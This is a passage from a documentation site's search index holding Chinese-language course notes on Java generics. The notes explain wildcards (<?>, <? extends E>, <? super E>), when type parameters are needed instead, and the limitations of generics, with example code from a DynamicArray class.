1\uff09 <T extends E> \u7528\u4e8e \u5b9a\u4e49 \u7c7b\u578b\u53c2\u6570\uff0c\u5b83\u58f0\u660e\u4e86\u4e00\u4e2a\u7c7b\u578b\u53c2\u6570 T \uff0c\u53ef\u653e\u5728\u6cdb\u578b\u7c7b\u5b9a\u4e49\u4e2d\u7c7b\u540d\u540e\u9762\u3001\u6cdb\u578b\u65b9\u6cd5\u8fd4\u56de\u503c\u524d\u9762\u3002 2\uff09 <\uff1fextends E> \u7528\u4e8e \u5b9e\u4f8b\u5316 \u7c7b\u578b\u53c2\u6570\uff0c\u5b83\u7528\u4e8e\u5b9e\u4f8b\u5316\u6cdb\u578b\u53d8\u91cf\u4e2d\u7684\u7c7b\u578b\u53c2\u6570\uff0c\u53ea\u662f\u8fd9\u4e2a\u5177\u4f53\u7c7b\u578b\u662f\u672a\u77e5\u7684\uff0c\u53ea\u77e5\u9053\u5b83\u662f E \u6216 E \u7684\u67d0\u4e2a\u5b50\u7c7b\u578b\u3002 \u867d\u7136\u5b83\u4eec\u4e0d\u4e00\u6837\uff0c\u4f46\u4e24\u79cd\u5199\u6cd5\u7ecf\u5e38\u53ef\u4ee5\u8fbe\u6210\u76f8\u540c\u76ee\u6807\uff0c\u6bd4\u5982\uff0c\u524d\u9762\u4f8b\u5b50\u4e2d\uff0c\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u90fd\u53ef\u4ee5\uff1a public void addAll(DynamicArray<? extends E> c) public <T extends E> void addAll(DynamicArray<T> c) \u90a3\u4e48\uff0c\u5230\u5e95\u5e94\u8be5\u7528\u54ea\u79cd\u5f62\u5f0f\u5462\uff1f\u6211\u4eec\u5148\u8fdb\u4e00\u6b65\u7406\u89e3\u901a\u914d\u7b26\uff0c\u7136\u540e\u518d\u89e3\u91ca\u3002 2.2.2. \u7406\u89e3\u901a\u914d\u7b26 # \u9664\u4e86\u6709\u9650\u5b9a\u901a\u914d\u7b26\uff0c\u8fd8\u6709\u4e00\u79cd\u901a\u914d\u7b26\uff0c\u5f62\u5982 DynamicArray<\uff1f> \uff0c\u79f0\u4e3a\u65e0\u9650\u5b9a\u901a\u914d\u7b26\u3002\u6211\u4eec\u6765\u770b\u4e2a\u4f8b\u5b50\uff0c\u5728 DynamicArray \u4e2d\u67e5\u627e\u6307\u5b9a\u5143\u7d20\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a public static int indexOf(DynamicArray<?> arr, Object elm){ for(int i=0; i<arr.size(); i++){ if(arr.get(i).equals(elm)){ return i; } } return -1; } \u5176\u5b9e\uff0c\u8fd9\u79cd\u65e0\u9650\u5b9a\u901a\u914d\u7b26\u5f62\u5f0f\u4e5f\u53ef\u4ee5\u6539\u4e3a\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0b\u9762\u7684\u5199\u6cd5\uff1a public static int indexOf(DynamicArray<?> arr, Object elm) \u53ef\u4ee5\u6539\u4e3a\uff1a public static <T> int indexOf(DynamicArray<T> arr, Object elm) \u4e0d\u8fc7\uff0c\u901a\u914d\u7b26\u5f62\u5f0f\u66f4\u4e3a\u7b80\u6d01\u3002\u867d\u7136\u901a\u914d\u7b26\u5f62\u5f0f\u66f4\u4e3a\u7b80\u6d01\uff0c\u4f46\u4e0a\u9762\u4e24\u79cd\u901a\u914d\u7b26\u90fd\u6709\u4e00\u4e2a\u91cd\u8981\u7684\u9650\u5236\uff1a\u53ea\u80fd\u8bfb\uff0c\u4e0d\u80fd\u5199\u3002\u600e\u4e48\u7406\u89e3\u5462\uff1f\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a DynamicArray<Integer> ints = new DynamicArray<>(); DynamicArray<? extends Number> numbers = ints; Integer a = 200; numbers.add(a); //\u9519\u8bef\uff01 numbers.add((Number)a)\uff1b //\u9519\u8bef\uff01 numbers.add((Object)a); //\u9519\u8bef\uff01 \u4e09\u79cdadd\u65b9\u6cd5\u90fd\u662f\u975e\u6cd5\u7684\uff0c\u65e0\u8bba\u662f Integer \uff0c\u8fd8\u662f Number \u6216 Object \uff0c\u7f16\u8bd1\u5668\u90fd\u4f1a\u62a5\u9519\u3002\u4e3a\u4ec0\u4e48\u5462\uff1f\u95ee\u53f7\u5c31\u662f\u8868\u793a\u7c7b\u578b\u5b89\u5168\u65e0\u77e5\uff0c \uff1fextends Number \u8868\u793a\u662f Number \u7684\u67d0\u4e2a\u5b50\u7c7b\u578b\uff0c\u4f46\u4e0d\u77e5\u9053\u5177\u4f53\u5b50\u7c7b\u578b\uff0c\u5982\u679c\u5141\u8bb8\u5199\u5165\uff0c Java \u5c31\u65e0\u6cd5\u786e\u4fdd\u7c7b\u578b\u5b89\u5168\u6027\uff0c\u6240\u4ee5\u5e72\u8106\u7981\u6b62\u3002\u6211\u4eec\u6765\u770b\u4e2a\u4f8b\u5b50\uff0c\u770b\u770b\u5982\u679c\u5141\u8bb8\u5199\u5165\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1a DynamicArray<Integer> ints = new DynamicArray<>(); DynamicArray<? extends Number> numbers = ints; Number n = new Double(23.0); Object o = new String(\"hello world\"); numbers.add(n); numbers.add(o); \u5982\u679c\u5141\u8bb8\u5199\u5165 Object \u6216 Number \u7c7b\u578b\uff0c\u5219\u6700\u540e\u4e24\u884c\u7f16\u8bd1\u5c31\u662f\u6b63\u786e\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c Java \u5c06\u5141\u8bb8\u628a Double \u6216 String \u5bf9\u8c61\u653e\u5165 Integer \u5bb9\u5668\uff0c\u8fd9\u663e\u7136\u8fdd\u80cc\u4e86 Java \u5173\u4e8e \u7c7b\u578b\u5b89\u5168 \u7684\u627f\u8bfa\u3002 \u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u9650\u5236\u662f\u597d\u7684\uff0c\u4f46\u8fd9\u4f7f\u5f97\u4e00\u4e9b\u7406\u5e94\u6b63\u786e\u7684\u57fa\u672c\u64cd\u4f5c\u65e0\u6cd5\u5b8c\u6210\uff0c\u6bd4\u5982\u4ea4\u6362\u4e24\u4e2a\u5143\u7d20\u7684\u4f4d\u7f6e\uff0c\u770b\u5982\u4e0b\u4ee3\u7801\uff1a public static void swap(DynamicArray<?> arr, int i, int j){ Object tmp = arr.get(i); arr.set(i, arr.get(j)); arr.set(j, tmp); } \u8fd9\u4e2a\u4ee3\u7801\u770b\u4e0a\u53bb\u5e94\u8be5\u662f\u6b63\u786e\u7684\uff0c\u4f46 Java \u4f1a\u63d0\u793a\u7f16\u8bd1\u9519\u8bef\uff0c\u4e24\u884c set \u8bed\u53e5\u90fd\u662f\u975e\u6cd5\u7684\u3002\u4e0d\u8fc7\uff0c\u501f\u52a9\u5e26\u7c7b\u578b\u53c2\u6570\u7684\u6cdb\u578b\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u5982\u4e0b\u89e3\u51b3\uff1a private static <T> void swapInternal(DynamicArray<T> arr, int i, int j){ T tmp = arr.get(i); arr.set(i, arr.get(j)); arr.set(j, tmp); } public static void swap(DynamicArray<?> arr, int i, int j){ swapInternal(arr, i, j); } swap \u53ef\u4ee5\u8c03\u7528 swapInternal \uff0c\u800c\u5e26\u7c7b\u578b\u53c2\u6570\u7684 swapInternal \u53ef\u4ee5\u5199\u5165\u3002 Java \u5bb9\u5668\u7c7b\u4e2d\u5c31\u6709\u7c7b\u4f3c\u8fd9\u6837\u7684\u7528\u6cd5\uff0c\u516c\u5171\u7684API\u662f\u901a\u914d\u7b26\u5f62\u5f0f\uff0c\u5f62\u5f0f\u66f4\u7b80\u5355\uff0c\u4f46\u5185\u90e8\u8c03\u7528\u5e26\u7c7b\u578b\u53c2\u6570\u7684\u65b9\u6cd5\u3002 \u9664\u4e86\u8fd9\u79cd\u9700\u8981\u5199\u7684\u573a\u5408\uff0c\u5982\u679c\u53c2\u6570\u7c7b\u578b\u4e4b\u95f4\u6709\u4f9d\u8d56\u5173\u7cfb\uff0c\u4e5f\u53ea\u80fd\u7528\u7c7b\u578b\u53c2\u6570\uff0c\u6bd4\u5982\uff0c\u5c06 src \u5bb9\u5668\u4e2d\u7684\u5185\u5bb9\u590d\u5236\u5230 dest \u4e2d\uff1a public static <D,S extends D> void copy(DynamicArray<D> dest, DynamicArray<S> src){ for(int i=0; i<src.size(); i++){ dest.add(src.get(i)); } } S \u548c D \u6709\u4f9d\u8d56\u5173\u7cfb\uff0c\u8981\u4e48\u76f8\u540c\uff0c\u8981\u4e48 S \u662f D \u7684\u5b50\u7c7b\uff0c\u5426\u5219\u7c7b\u578b\u4e0d\u517c\u5bb9\uff0c\u6709\u7f16\u8bd1\u9519\u8bef\u3002\u4e0d\u8fc7\uff0c\u4e0a\u9762\u7684\u58f0\u660e\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26\u7b80\u5316\uff0c\u4e24\u4e2a\u53c2\u6570\u53ef\u4ee5\u7b80\u5316\u4e3a\u4e00\u4e2a\uff0c\u5982\u4e0b\u6240\u793a\uff1a public static <D> void copy(DynamicArray<D> dest, DynamicArray<? extends D> src){ for(int i=0; i<src.size(); i++){ dest.add(src.get(i)); } } \u5982\u679c\u8fd4\u56de\u503c\u4f9d\u8d56\u4e8e\u7c7b\u578b\u53c2\u6570\uff0c\u4e5f\u4e0d\u80fd\u7528\u901a\u914d\u7b26\uff0c\u6bd4\u5982\uff0c\u8ba1\u7b97\u52a8\u6001\u6570\u7ec4\u4e2d\u7684\u6700\u5927\u503c\uff0c\u5982\u4e0b\u6240\u793a\uff1a public static <T extends Comparable<T>> T max(DynamicArray<T> arr){ T max = arr.get(0); for(int i=1; i<arr.size(); i++){ if(arr.get(i).compareTo(max)>0){ max = arr.get(i); } } return max; } \u4e0a\u9762\u7684\u4ee3\u7801\u5c31\u96be\u4ee5\u7528\u901a\u914d\u7b26\u4ee3\u66ff\u3002 \u73b0\u5728\u6211\u4eec\u518d\u6765\u770b\u6cdb\u578b\u65b9\u6cd5\u5230\u5e95\u5e94\u8be5\u7528\u901a\u914d\u7b26\u7684\u5f62\u5f0f\u8fd8\u662f\u52a0\u7c7b\u578b\u53c2\u6570\u3002\u4e24\u8005\u5230\u5e95\u6709\u4ec0\u4e48\u5173\u7cfb\uff1f\u6211\u4eec\u603b\u7ed3\u5982\u4e0b\u3002 \u901a\u914d\u7b26\u5f62\u5f0f\u90fd\u53ef\u4ee5\u7528 \u7c7b\u578b\u53c2\u6570\u7684\u5f62\u5f0f \u6765\u66ff\u4ee3\uff0c\u901a\u914d\u7b26\u80fd\u505a\u7684\uff0c\u7528\u7c7b\u578b\u53c2\u6570\u90fd\u80fd\u505a\u3002 \u901a\u914d\u7b26\u5f62\u5f0f \u53ef\u4ee5\u51cf\u5c11\u7c7b\u578b\u53c2\u6570 \uff0c\u5f62\u5f0f\u4e0a\u5f80\u5f80 \u66f4\u4e3a\u7b80\u5355 \uff0c\u53ef\u8bfb\u6027\u4e5f\u66f4\u597d\uff0c\u6240\u4ee5\uff0c \u80fd\u7528\u901a\u914d\u7b26\u7684\u5c31\u7528\u901a\u914d\u7b26 \u3002 \u5982\u679c\u7c7b\u578b\u53c2\u6570\u4e4b\u95f4 \u6709\u4f9d\u8d56\u5173\u7cfb \uff0c\u6216\u8005 \u8fd4\u56de\u503c\u4f9d\u8d56\u7c7b\u578b\u53c2\u6570 \uff0c\u6216\u8005 \u9700\u8981\u5199\u64cd\u4f5c \uff0c\u5219 \u53ea\u80fd\u7528\u7c7b\u578b\u53c2\u6570 \u3002 \u901a\u914d\u7b26\u5f62\u5f0f\u548c\u7c7b\u578b\u53c2\u6570\u5f80\u5f80 \u914d\u5408\u4f7f\u7528 \uff0c\u6bd4\u5982\uff0c\u4e0a\u9762\u7684copy\u65b9\u6cd5\uff0c\u5b9a\u4e49\u5fc5\u8981\u7684\u7c7b\u578b\u53c2\u6570\uff0c\u4f7f\u7528\u901a\u914d\u7b26\u8868\u8fbe\u4f9d\u8d56\uff0c\u5e76\u63a5\u53d7\u66f4\u5e7f\u6cdb\u7684\u6570\u636e\u7c7b\u578b\u3002 2.2.3. \u8d85\u7c7b\u578b\u901a\u914d\u7b26 # \u8fd8\u6709\u4e00\u79cd\u901a\u914d\u7b26\uff0c\u4e0e\u5f62\u5f0f <\uff1fextends E> \u6b63\u597d\u76f8\u53cd\uff0c\u5b83\u7684\u5f62\u5f0f\u4e3a <\uff1fsuper E> \uff0c\u79f0\u4e3a \u8d85\u7c7b\u578b\u901a\u914d\u7b26 \uff0c\u8868\u793a E \u7684\u67d0\u4e2a \u7236\u7c7b\u578b \u3002\u5b83\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u6709\u4e86\u5b83\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u66f4\u7075\u6d3b\u5730\u5199\u5165\u4e86\u3002 \u5982\u679c\u6ca1\u6709\u8fd9\u79cd\u8bed\u6cd5\uff0c\u5199\u5165\u4f1a\u6709\u4e00\u4e9b\u9650\u5236\u3002\u6765\u770b\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u7ed9 DynamicArray \u6dfb\u52a0\u4e00\u4e2a\u65b9\u6cd5\uff1a public void copyTo(DynamicArray<E> dest){ for(int i=0; i<size; i++){ dest.add(get(i)); } } \u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u5f88\u7b80\u5355\uff0c\u5c06\u5f53\u524d\u5bb9\u5668\u4e2d\u7684\u5143\u7d20\u6dfb\u52a0\u5230\u4f20\u5165\u7684\u76ee\u6807\u5bb9\u5668\u4e2d\u3002\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u8fd9\u4e48\u4f7f\u7528\uff1a DynamicArray<Integer> ints = new DynamicArray<Integer>(); ints.add(100); ints.add(34); DynamicArray<Number> numbers = new DynamicArray<Number>(); ints.copyTo(numbers); Integer \u662f Number \u7684\u5b50\u7c7b\uff0c\u5c06 Integer \u5bf9\u8c61\u62f7\u8d1d\u5165 Number \u5bb9\u5668\uff0c\u8fd9\u79cd\u7528\u6cd5\u5e94\u8be5\u662f\u5408\u60c5\u5408\u7406\u7684\uff0c\u4f46 Java \u4f1a\u63d0\u793a\u7f16\u8bd1\u9519\u8bef\uff0c\u7406\u7531\u6211\u4eec\u4e4b\u524d\u4e5f\u8bf4\u8fc7\u4e86\uff0c\u671f\u671b\u7684\u53c2\u6570\u7c7b\u578b\u662f Dynamic-Array<Integer> \uff0c DynamicArray<Number> \u5e76\u4e0d\u9002\u7528\u3002 \u5982\u4e4b\u524d\u6240\u8bf4\uff0c\u4e00\u822c\u800c\u8a00\uff0c\u4e0d\u80fd\u5c06 DynamicArray<Integer> \u770b\u4f5c DynamicArray<Number> \uff0c\u4f46\u6211\u4eec\u8fd9\u91cc\u7684\u7528\u6cd5\u662f\u6ca1\u6709\u95ee\u9898\u7684\uff0c Java \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u65b9\u6cd5\u5c31\u662f\u8d85\u7c7b\u578b\u901a\u914d\u7b26\uff0c\u53ef\u4ee5\u5c06copyTo\u4ee3\u7801\u6539\u4e3a\uff1a public void copyTo(DynamicArray<? super E> dest){ for(int i=0; i<size; i++){ dest.add(get(i)); } } \u8fd9\u6837\uff0c\u5c31\u6ca1\u6709\u95ee\u9898\u4e86\u3002 \u8d85\u7c7b\u578b\u901a\u914d\u7b26\u53e6\u4e00\u4e2a\u5e38\u7528\u7684\u573a\u5408\u662f Comparable/Comparator \u63a5\u53e3\u3002\u540c\u6837\uff0c\u6211\u4eec\u5148\u6765\u770b\u4e0b\u5982\u679c\u4e0d\u4f7f\u7528\u4f1a\u6709\u4ec0\u4e48\u9650\u5236\u3002\u4ee5\u524d\u9762\u8ba1\u7b97\u6700\u5927\u503c\u7684\u65b9\u6cd5\u4e3a\u4f8b\uff0c\u5b83\u7684\u65b9\u6cd5\u58f0\u660e\u662f\uff1a public static <T extends Comparable<T>> T max(DynamicArray<T> arr) \u8fd9\u4e2a\u58f0\u660e\u6709\u4ec0\u4e48\u9650\u5236\u5462\uff1f\u4e3e\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u6709\u4e24\u4e2a\u7c7b Base \u548c Child \uff0c Base \u7684\u4ee3\u7801\u662f\uff1a class Base implements Comparable<Base>{ private int sortOrder; public Base(int sortOrder) { this.sortOrder = sortOrder; } @Override public int compareTo(Base o) { if(sortOrder < o.sortOrder){ return -1; }else if(sortOrder > o.sortOrder){ return 1; }else{ return 0; } } } Base \u4ee3\u7801\u5f88\u7b80\u5355\uff0c\u5b9e\u73b0\u4e86 Comparable \u63a5\u53e3\uff0c\u6839\u636e\u5b9e\u4f8b\u53d8\u91cf sortOrder \u8fdb\u884c\u6bd4\u8f83\u3002 Child \u4ee3\u7801\u662f\uff1a class Child extends Base { public Child(int sortOrder) { super(sortOrder); } } \u8fd9\u91cc\uff0c Child \u975e\u5e38\u7b80\u5355\uff0c\u53ea\u662f\u7ee7\u627f\u4e86 Base \u3002\u6ce8\u610f\uff1a Child \u6ca1\u6709\u91cd\u65b0\u5b9e\u73b0 Comparable \u63a5\u53e3\uff0c\u56e0\u4e3a Child \u7684\u6bd4\u8f83\u89c4\u5219\u548c Base \u662f\u4e00\u6837\u7684\u3002\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u4f7f\u7528\u524d\u9762\u7684max\u65b9\u6cd5\u64cd\u4f5c Child \u5bb9\u5668\uff0c\u5982\u4e0b\u6240\u793a\uff1a DynamicArray<Child> childs = new DynamicArray<Child>(); childs.add(new Child(20)); childs.add(new Child(80)); Child maxChild = max(childs); \u9057\u61be\u7684\u662f\uff0c Java \u4f1a\u63d0\u793a\u7f16\u8bd1\u9519\u8bef\uff0c\u7c7b\u578b\u4e0d\u5339\u914d\u3002\u4e3a\u4ec0\u4e48\u4e0d\u5339\u914d\u5462\uff1f\u6211\u4eec\u53ef\u80fd\u4f1a\u8ba4\u4e3a\uff0c Java \u4f1a\u5c06 max \u65b9\u6cd5\u7684\u7c7b\u578b\u53c2\u6570 T \u63a8\u65ad\u4e3a Child \u7c7b\u578b\uff0c\u4f46\u7c7b\u578bT\u7684\u8981\u6c42\u662f extends Comparable<T> \uff0c\u800c Child \u5e76\u6ca1\u6709\u5b9e\u73b0 Comparable<Child> \uff0c\u5b83\u5b9e\u73b0\u7684\u662f Comparable<Base> \u3002 \u4f46\u6211\u4eec\u7684\u9700\u6c42\u662f\u5408\u7406\u7684\uff0cBase\u7c7b\u7684\u4ee3\u7801\u5df2\u7ecf\u6709\u4e86\u5173\u4e8e\u6bd4\u8f83\u6240\u9700\u8981\u7684\u5168\u90e8\u6570\u636e\uff0c\u5b83\u5e94\u8be5\u53ef\u4ee5\u7528\u4e8e\u6bd4\u8f83Child\u5bf9\u8c61\u3002\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u4fee\u6539max\u7684\u65b9\u6cd5\u58f0\u660e\uff0c\u4f7f\u7528\u8d85\u7c7b\u578b\u901a\u914d\u7b26\uff0c\u5982\u4e0b\u6240\u793a\uff1a public static <T extends Comparable<? super T>> T max(DynamicArray<T> arr) \u8fd9\u4e48\u4fee\u6539\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4e86\uff0c\u8fd9\u79cd\u5199\u6cd5\u6bd4\u8f83\u62bd\u8c61\uff0c\u5c06 T \u66ff\u6362\u4e3a Child \uff0c\u5c31\u662f\uff1a Child extends Comparable<? super Child> <\uff1fsuper Child> \u53ef\u4ee5\u5339\u914d Base \uff0c\u6240\u4ee5\u6574\u4f53\u5c31\u662f\u5339\u914d\u7684\u3002 \u6211\u4eec\u6bd4\u8f83\u4e00\u4e0b\u7c7b\u578b\u53c2\u6570\u9650\u5b9a\u4e0e\u8d85\u7c7b\u578b\u901a\u914d\u7b26\uff0c\u7c7b\u578b\u53c2\u6570\u9650\u5b9a\u53ea\u6709 extends \u5f62\u5f0f\uff0c\u6ca1\u6709 super \u5f62\u5f0f\uff0c\u6bd4\u5982\uff0c\u524d\u9762\u7684 copyTo\u65b9\u6cd5 \u7684\u901a\u914d\u7b26\u5f62\u5f0f\u7684\u58f0\u660e\u4e3a\uff1a public void copyTo(DynamicArray<? super E> dest) \u5982\u679c\u7c7b\u578b\u53c2\u6570\u9650\u5b9a\u652f\u6301 super \u5f62\u5f0f\uff0c\u5219\u5e94\u8be5\u662f\uff1a public <T super E> void copyTo(DynamicArray<T> dest) \u4e8b\u5b9e\u662f\uff0c Java \u5e76\u4e0d\u652f\u6301\u8fd9\u79cd\u8bed\u6cd5\u3002 \u524d\u9762\u6211\u4eec\u8bf4\u8fc7\uff0c\u5bf9\u4e8e\u6709\u9650\u5b9a\u7684\u901a\u914d\u7b26\u5f62\u5f0f <\uff1fextends E> \uff0c\u53ef\u4ee5\u7528\u7c7b\u578b\u53c2\u6570\u9650\u5b9a\u66ff\u4ee3\uff0c\u4f46\u662f\u5bf9\u4e8e\u7c7b\u4f3c\u4e0a\u9762\u7684\u8d85\u7c7b\u578b\u901a\u914d\u7b26\uff0c\u5219\u65e0\u6cd5\u7528\u7c7b\u578b\u53c2\u6570\u66ff\u4ee3\u3002 2.2.4. \u901a\u914d\u7b26\u6bd4\u8f83 # \u672c\u8282\u4ecb\u7ecd\u4e86\u6cdb\u578b\u4e2d\u7684\u4e09\u79cd\u901a\u914d\u7b26\u5f62\u5f0f <\uff1f> \u3001 <\uff1fsuper E> \u548c <\uff1fextends E> \uff0c\u5e76\u5206\u6790\u4e86\u4e0e\u7c7b\u578b\u53c2\u6570\u5f62\u5f0f\u7684\u533a\u522b\u548c\u8054\u7cfb\uff0c\u5b83\u4eec\u6bd4\u8f83\u5bb9\u6613\u6df7\u6dc6\uff0c\u6211\u4eec\u603b\u7ed3\u6bd4\u8f83\u5982\u4e0b\uff1a \u5b83\u4eec\u7684\u76ee\u7684\u90fd\u662f\u4e3a\u4e86\u4f7f\u65b9\u6cd5\u63a5\u53e3\u66f4\u4e3a\u7075\u6d3b\uff0c\u53ef\u4ee5\u63a5\u53d7\u66f4\u4e3a\u5e7f\u6cdb\u7684\u7c7b\u578b\u3002 <\uff1fsuper E> \u7528\u4e8e\u7075\u6d3b\u5199\u5165\u6216\u6bd4\u8f83\uff0c\u4f7f\u5f97\u5bf9\u8c61\u53ef\u4ee5\u5199\u5165\u7236\u7c7b\u578b\u7684\u5bb9\u5668\uff0c\u4f7f\u5f97\u7236\u7c7b\u578b\u7684\u6bd4\u8f83\u65b9\u6cd5\u53ef\u4ee5\u5e94\u7528\u4e8e\u5b50\u7c7b\u5bf9\u8c61\uff0c\u5b83\u4e0d\u80fd\u88ab\u7c7b\u578b\u53c2\u6570\u5f62\u5f0f\u66ff\u4ee3\u3002 <\uff1f> \u548c <\uff1fextends E> \u7528\u4e8e\u7075\u6d3b\u8bfb\u53d6\uff0c\u4f7f\u5f97\u65b9\u6cd5\u53ef\u4ee5\u8bfb\u53d6E\u6216E\u7684\u4efb\u610f\u5b50\u7c7b\u578b\u7684\u5bb9\u5668\u5bf9\u8c61\uff0c\u5b83\u4eec\u53ef\u4ee5\u7528\u7c7b\u578b\u53c2\u6570\u7684\u5f62\u5f0f\u66ff\u4ee3\uff0c\u4f46\u901a\u914d\u7b26\u5f62\u5f0f\u66f4\u4e3a\u7b80\u6d01\u3002 Java \u5bb9\u5668\u7c7b\u7684\u5b9e\u73b0\u4e2d\uff0c\u6709\u5f88\u591a\u4f7f\u7528\u901a\u914d\u7b26\u7684\u4f8b\u5b50\uff0c\u6bd4\u5982\uff0c\u7c7b Collections \u4e2d\u5c31\u6709\u5982\u4e0b\u65b9\u6cd5\uff1a public static <T extends Comparable<? super T>> void sort(List<T> list) public static <T> void sort(List<T> list, Comparator<? super T> c) public static <T> void copy(List<? super T> dest, List<? extends T> src) public static <T> T max(Collection<? extends T> coll, Comparator<? super T> comp) 2.3. \u7ec6\u8282\u548c\u5c40\u9650\u6027 # \u6cdb\u578b\u4e5f\u5b58\u5728\u4e00\u4e9b\u5c40\u9650\u6027\uff0c\u8fd9\u4e9b\u5c40\u9650\u6027\u4e3b\u8981\u662f\u7531\u4e8e Java \u6cdb\u578b\u7684\u5b9e\u73b0\u673a\u5236\u5f15\u8d77\u7684\uff0c\u8fd9\u4e9b\u5c40\u9650\u6027\u5305\u62ec\uff1a \u4e0d\u80fd\u4f7f\u7528\u57fa\u672c\u7c7b\u578b \u6ca1\u6709\u8fd0\u884c\u65f6\u7c7b\u578b\u4fe1\u606f \u7c7b\u578b\u64e6\u9664\u4f1a\u5f15\u53d1\u4e00\u4e9b\u51b2\u7a81 \u4e0d\u80fd\u901a\u8fc7\u7c7b\u578b\u53c2\u6570\u521b\u5efa\u5bf9\u8c61 \u4e0d\u80fd\u7528\u4e8e\u9759\u6001\u53d8\u91cf \u4e0d\u80fd\u521b\u5efa\u6cdb\u578b\u6570\u7ec4\uff0c\u9700\u8981\u901a\u8fc7\u6cdb\u578b\u5bb9\u5668\u6765\u5b9e\u73b0\u6570\u7ec4\u529f\u80fd \u6211\u4eec\u9700\u8981\u7406\u89e3\u8fd9\u4e9b\u5c40\u9650\u6027\uff0c\u5e78\u8fd0\u7684\u662f\uff0c\u4e00\u822c\u5e76\u4e0d\u9700\u8981\u7279\u522b\u53bb\u8bb0\u5fc6\uff0c\u56e0\u4e3a\u7528\u9519\u7684\u65f6\u5019\uff0c Java \u5f00\u53d1\u73af\u5883\u548c\u7f16\u8bd1\u5668\u4f1a\u8fdb\u884c\u63d0\u793a\uff0c\u5f53\u88ab\u63d0\u793a\u65f6\u80fd\u591f\u7406\u89e3\u5e76\u4ece\u5bb9\u5e94\u5bf9\u5373\u53ef\u3002 3. \u53c2\u8003\u6587\u732e # [1] \u9a6c\u4fca\u660c. Java \u7f16\u7a0b\u7684\u903b\u8f91 [M]. \u5317\u4eac : \u673a\u68b0\u5de5\u4e1a\u51fa\u7248\u793e, 2018. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.Java\u4e2d\u7684\u6cdb\u578b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#java","text":"","title":"Java\u4e2d\u7684\u6cdb\u578b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#_1","text":"Java\u4e2d\u7684\u6cdb\u578b \u76ee\u5f55 1. \u80cc\u666f 2. \u6cdb\u578b 2.1. \u57fa\u672c\u6982\u5ff5\u548c\u539f\u7406 2.1.1. \u4e00\u4e2a\u7b80\u5355\u6cdb\u578b\u7c7b 2.1.2. \u5c0f\u7ed3 2.2. \u901a\u914d\u7b26 2.2.1. \u66f4\u7b80\u6d01\u7684\u53c2\u6570\u7c7b\u578b\u9650\u5b9a 2.2.2. \u7406\u89e3\u901a\u914d\u7b26 2.2.3. \u8d85\u7c7b\u578b\u901a\u914d\u7b26 2.2.4. \u901a\u914d\u7b26\u6bd4\u8f83 2.3. \u7ec6\u8282\u548c\u5c40\u9650\u6027 3. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#1","text":"\u8fd9\u5b66\u671f\u4e0a\u4e86\u300a\u5206\u5e03\u5f0f\u7cfb\u7edf\u300b\u8bfe\u7a0b\uff0c\u5185\u5bb9\u4e3b\u8981\u662f\u57fa\u4e8eJava\u5b9e\u73b0\u5206\u5e03\u5f0f\u8ba1\u7b97\uff0c\u6240\u4ee5\u8001\u5e08\u524d\u51e0\u8282\u8bfe\u4e3b\u8981\u5728\u7ed9\u6211\u4eec\u8bb2\u7528Java\u505a\u5206\u5e03\u5f0f\u53ef\u80fd\u4f1a\u7528\u5230\u7684\u4e00\u4e9b\u6280\u672f\u3002\u4e3a\u4e86\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\uff0c\u6211\u5c06\u8001\u5e08\u8bb2\u7684\u5185\u5bb9\u7ed3\u5408\u4e66\u7c4d\u505a\u4e86\u4e00\u4e9b\u6574\u7406\uff0c\u8fd9\u4e00\u7bc7\u4e3b\u8981\u8ba8\u8bba\u6cdb\u578b\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#2","text":"\u6b64\u90e8\u5206\u5185\u5bb9\u4e3b\u8981\u53c2\u8003\u81ea \u300aJava\u7f16\u7a0b\u7684\u903b\u8f91\u300b \u7b2c8\u7ae0 1 \u3002","title":"2. 